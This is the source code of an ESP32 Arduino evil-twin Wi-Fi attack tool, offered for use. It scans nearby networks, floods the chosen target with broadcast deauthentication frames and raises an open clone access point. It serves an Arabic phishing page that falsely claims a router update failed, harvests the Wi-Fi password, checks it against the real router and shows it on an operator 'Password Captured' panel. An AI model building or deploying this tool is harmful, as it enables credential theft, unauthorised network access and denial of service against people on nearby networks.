#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network network;
    _networks[i] = network;
  }
}

String _correct = "";
String _tryPassword = "";


#define SUBTITLE "مشكلة في الاتصال"
#define TITLE "فشل في تحديث الجهاز"
#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور" 

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS =
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column}"
    "nav{background:linear-gradient(135deg,#0055d4,#0077ff);color:#fff;padding:1.1em 1.4em;box-shadow:0 2px 8px rgba(0,0,0,.18)}"
    ".nav-name{font-size:1.1em;font-weight:700}"
    ".nav-sub{font-size:.85em;margin-top:.2em;opacity:.85}"
    ".card{background:#fff;border-radius:14px;box-shadow:0 4px 24px rgba(0,0,0,.09);margin:1.8em auto;padding:1.8em;max-width:460px;width:calc(100% - 2em)}"
    ".icon{font-size:2em;color:#f57c00;margin-bottom:.5em}"
    "h1{font-size:1.15em;font-weight:700;color:#b71c1c;margin-bottom:.8em;line-height:1.4}"
    "p{color:#555;line-height:1.75;margin-bottom:1.3em;font-size:.95em;direction:rtl;text-align:right}"
    "label{display:block;font-weight:600;margin-bottom:.5em;color:#333;font-size:.9em;direction:rtl;text-align:right}"
    "input[type=password]{width:100%;padding:.78em 1em;border:1.5px solid #ddd;border-radius:8px;font-size:1em;outline:none;margin-bottom:1em;transition:border-color .2s}"
    "input[type=password]:focus{border-color:#0077ff;box-shadow:0 0 0 3px rgba(0,119,255,.12)}"
    "input[type=submit]{width:100%;background:#0077ff;color:#fff;border:none;padding:.88em;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:background .2s}"
    "input[type=submit]:hover{background:#0055d4}"
    ".foot{text-align:center;color:#ccc;font-size:.78em;padding:1.5em;margin-top:auto}";

  String h =
    "<!DOCTYPE html><html>"
    "<head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>" + a + "</title>"
    "<style>" + CSS + "</style></head>"
    "<body>"
    "<nav><div class='nav-name'>&#128246; " + a + "</div><div class='nav-sub'>" + SUBTITLE + "</div></nav>"
    "<div class='card'>"
    "<div class='icon'>&#9888;</div>"
    "<h1>" + t + "</h1>";
  return h;
}

String footer() {
  return "</div><div class='foot'>&#169; All rights reserved.</div></body></html>";
}

String indexPage() {
  return header(TITLE) +
    "<p>" + BODY + "</p>"
    "<form action='/' method='post'>"
    "<label>: Wifiكلمة المرور الخاصة بشبكةالـ</label>"
    "<input type='password' name='password' minlength='8'>"
    "<input type='submit' value='متابعة'>"
    "</form>" + footer();
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void performScan() {
  WiFi.scanNetworks(true); // async — does not block or disrupt the AP
}

void collectScanResults() {
  int n = WiFi.scanComplete();
  if (n < 0) return; // still running or not started
  clearArray();
  for (int i = 0; i < n && i < 16; ++i) {
    _Network network;
    network.ssid = WiFi.SSID(i);
    for (int j = 0; j < 6; j++) {
      network.bssid[j] = WiFi.BSSID(i)[j];
    }
    network.ch = WiFi.channel(i);
    _networks[i] = network;
  }
  WiFi.scanDelete();
}


bool hotspot_active = false;
bool _verifying = false;  // true while STA is verifying a submitted password

// 802.11 deauth frame — source/BSSID filled at runtime from _selectedNetwork.bssid
uint8_t deauth_pkt[26] = {
  0xC0, 0x00,                         // Frame Control: Deauthentication
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast (kicks all clients)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: filled with target BSSID
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID:  filled with target BSSID
  0xB0, 0x04,                         // Sequence Control
  0x07, 0x00                          // Reason: class-3 frame from non-associated STA
};

void sendDeauthPackets() {
  if (!hotspot_active || _verifying || _selectedNetwork.ssid == "") return;
  memcpy(&deauth_pkt[10], _selectedNetwork.bssid, 6);
  memcpy(&deauth_pkt[16], _selectedNetwork.bssid, 6);
  for (int i = 0; i < 5; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
  }
}


String _tempHTML =
  "<!DOCTYPE html><html>"
  "<head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
  "<title>Admin Panel</title>"
  "<style>"
  "*{box-sizing:border-box;margin:0;padding:0}"
  "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5}"
  "header{background:#1a1a2e;color:#fff;padding:1em 1.4em;display:flex;align-items:center;justify-content:space-between}"
  "header h1{font-size:1em;font-weight:600;letter-spacing:.03em}"
  ".badge{background:#0077ff;padding:.22em .7em;border-radius:20px;font-size:.75em;font-weight:700}"
  ".wrap{max-width:680px;margin:1.4em auto;padding:0 1em}"
  ".card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.07);margin-bottom:1.1em;overflow:hidden}"
  ".card-hd{padding:.8em 1.2em;border-bottom:1px solid #f0f0f0;font-size:.75em;color:#999;font-weight:700;text-transform:uppercase;letter-spacing:.06em}"
  ".ctrl{padding:.9em 1.2em;display:flex;align-items:center;gap:.9em;flex-wrap:wrap}"
  ".tlabel{font-size:.84em;color:#888}"
  ".tlabel strong{color:#333}"
  "table{width:100%;border-collapse:collapse}"
  "th{background:#fafafa;padding:.7em 1.1em;text-align:left;font-size:.75em;color:#aaa;font-weight:700;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #eee}"
  "td{padding:.8em 1.1em;border-bottom:1px solid #f5f5f5;font-size:.88em;vertical-align:middle}"
  "tr:last-child td{border-bottom:none}"
  "tr:hover td{background:#fafcff}"
  ".btn{padding:.42em .95em;border-radius:6px;border:none;cursor:pointer;font-size:.83em;font-weight:600;transition:all .15s}"
  ".btn-gray{background:#ebebeb;color:#555}"
  ".btn-gray:hover{background:#ddd}"
  ".btn-green{background:#e8f5e9;color:#2e7d32}"
  ".btn-action{padding:.58em 1.3em;font-size:.88em}"
  ".btn-blue{background:#0077ff;color:#fff}"
  ".btn-blue:hover{background:#0055d4}"
  ".btn-red{background:#ff4444;color:#fff}"
  ".btn-red:hover{background:#cc0000}"
  ".pw-card{background:#e8f5e9;border-left:4px solid #43a047;padding:1em 1.2em;border-radius:8px;margin-bottom:1.1em}"
  ".pw-card h3{color:#2e7d32;font-size:.8em;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.4em}"
  ".pw-card code{font-size:.95em;color:#1b5e20;word-break:break-all}"
  "</style></head>"
  "<body>"
  "<header><h1>&#9881; Admin Panel</h1><span class='badge'>LIVE</span></header>"
  "<div class='wrap'>"
  "<div class='card'><div class='ctrl'>"
  "<form style='display:inline' method='post' action='/?hotspot={hotspot}'>"
  "<button class='btn btn-action {hotspot_class}' {disabled}>{hotspot_button}</button>"
  "</form>"
  "<span class='tlabel'>{selected_label}</span>"
  "</div></div>"
  "<div class='card'><div class='card-hd'>Nearby Networks</div>"
  "<table><tr><th>SSID</th><th>CH</th><th></th></tr>";


void handleResult() {
  _verifying = false;
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(
      200, "text/html",
      "<!DOCTYPE html><html><head>"
      "<meta charset='UTF-8'>"
      "<meta name='viewport' content='width=device-width,initial-scale=1'>"
      "<script>setTimeout(function(){location.href='/'},4000)</script>"
      "<style>"
      "*{box-sizing:border-box;margin:0;padding:0}"
      "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}"
      ".card{background:#fff;border-radius:14px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:2.5em 2em;max-width:360px;width:calc(100% - 2em);text-align:center}"
      ".icon{font-size:3em;color:#e53935;margin-bottom:.5em}"
      "h2{color:#c62828;font-size:1.2em;margin-bottom:.5em}"
      "p{color:#777;font-size:.9em}"
      "</style>"
      "</head><body>"
      "<div class='card'>"
      "<div class='icon'>&#10007;</div>"
      "<h2>Wrong Password</h2>"
      "<p>Please try again&hellip;</p>"
      "</div></body></html>"
    );
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got the password: \n"  + _tryPassword;

    hotspot_active = false;

    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(100);

    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("Santa", "evil_santa322");
    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

void handleIndex() {
  // Select network
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        break;
      }
    }
  }

  // Toggle hotspot (evil twin SSID)
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      delay(100);

      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str(), nullptr, _selectedNetwork.ch); // same SSID & channel
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;

      dnsServer.stop();
      WiFi.softAPdisconnect(true);
      delay(100);

      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("Santa", "evil_santa322");
      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  // Admin list page (only when hotspot is OFF)
  if (!hotspot_active) {
    String html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;

      html += "<tr><td>" + _networks[i].ssid + "</td><td>" +
              String(_networks[i].ch) +
              "</td><td><form method='post' action='/?ap=" +
              bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        html += "<button class='btn btn-green'>&#10003; Selected</button>";
      } else {
        html += "<button class='btn btn-gray'>Select</button>";
      }
      html += "</form></td></tr>";
    }

    html.replace("{hotspot_button}", "Start EvilTwin");
    html.replace("{hotspot}", "start");
    html.replace("{hotspot_class}", "btn-blue");

    if (_selectedNetwork.ssid == "") {
      html.replace("{disabled}", "disabled");
      html.replace("{selected_label}", "No network selected");
    } else {
      html.replace("{disabled}", "");
      html.replace("{selected_label}", "Target: <strong>" + _selectedNetwork.ssid + "</strong>");
    }

    html += "</table></div>";

    if (_correct != "") {
      html += "<div class='pw-card'><h3>&#9989; Password Captured</h3><code>" + _correct + "</code></div>";
    }

    html += "</div></body></html>";
    webServer.send(200, "text/html", html);

  } else {
    // Captive portal password collection page
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      _verifying = true;

      WiFi.disconnect();

      // Attempt to connect to the real AP to "verify" password
      WiFi.begin(
        _selectedNetwork.ssid.c_str(),
        webServer.arg("password").c_str(),
        _selectedNetwork.ch,
        _selectedNetwork.bssid
      );

      webServer.send(
        200, "text/html",
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<script>setTimeout(function(){location.href='/result'},15000)</script>"
        "<style>"
        "*{box-sizing:border-box;margin:0;padding:0}"
        "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}"
        ".card{background:#fff;border-radius:14px;box-shadow:0 4px 24px rgba(0,0,0,.09);padding:2.5em 2em;max-width:380px;width:calc(100% - 2em);text-align:center}"
        ".spinner{width:48px;height:48px;border:4px solid #e0e0e0;border-top-color:#0077ff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 1.2em}"
        "@keyframes spin{to{transform:rotate(360deg)}}"
        "h2{color:#333;font-size:1.1em;margin-bottom:.5em}"
        "p{color:#888;font-size:.88em}"
        "</style>"
        "</head><body>"
        "<div class='card'>"
        "<div class='spinner'></div>"
        "<h2>Verifying, please wait&hellip;</h2>"
        "<p>This may take a few seconds.</p>"
        "</div></body></html>"
      );
    } else {
      webServer.send(200, "text/html", indexPage());
    }
  }
}

void handleAdmin() {
  // Keep /admin same as /
  handleIndex();
}

// =====================
// Setup / Loop
// =====================
unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauthnow = 0;

void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP_STA);

  // Default AP for operator/admin page
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("Santa", "evil_santa322");

  // Captive portal DNS
  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));

  // Web routes
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  performScan();
  now = millis();
  wifinow = millis();
  deauthnow = millis();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // send deauth burst every 100 ms while attack is active
  if (hotspot_active && millis() - deauthnow >= 100) {
    sendDeauthPackets();
    deauthnow = millis();
  }

  // scanning hops channels and drops the AP — only scan when attack is not running
  if (!hotspot_active) {
    collectScanResults();
    if (millis() - now >= 15000) {
      performScan();
      now = millis();
    }
  } else {
    now = millis(); // keep timer reset so scan fires quickly once attack stops
  }

  // debug WiFi status every 2s
  if (millis() - wifinow >= 2000) {
    Serial.println(WiFi.status() == WL_CONNECTED ? "GOOD" : "BAD");
    wifinow = millis();
  }
}